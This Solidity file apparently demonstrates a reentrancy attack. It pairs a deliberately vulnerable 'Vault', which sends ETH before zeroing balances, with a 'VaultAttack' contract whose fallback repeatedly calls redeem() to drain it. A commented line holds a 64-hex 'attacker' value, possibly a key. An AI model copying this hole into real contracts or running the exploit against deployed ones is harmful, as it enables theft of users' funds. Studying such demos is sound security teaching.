// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.19;

// You can store ETH in this contract and redeem them.
contract Vault {
    mapping(address => uint256) public balances;

    /// @dev Store ETH in the contract.
    function store() public payable {
        balances[msg.sender] += msg.value;
    }

    /// @dev Redeem your ETH.
    function redeem() public {
        msg.sender.call{value: balances[msg.sender]}("");
        balances[msg.sender] = 0;
    }
}

contract VaultAttack {
    Vault public vault;

    constructor(address _vaultAddress) {
        vault = Vault(_vaultAddress);
    }

    // Fallback is called when Vault sends Ether to this contract.
    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.redeem();
        }
    }

    // address contractToAttack = "0xd9145CCE52D386f254917e481eB44e9943F39138";
    // address attacker = "0x08625103c2268fc7db74ed67d25fe0af2a487753ee68ab4b52a563c9418b2ec1";
    function attack() external payable {
        require(msg.value >= 1 ether);
        vault.store{value: 1 ether}();
        vault.redeem();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
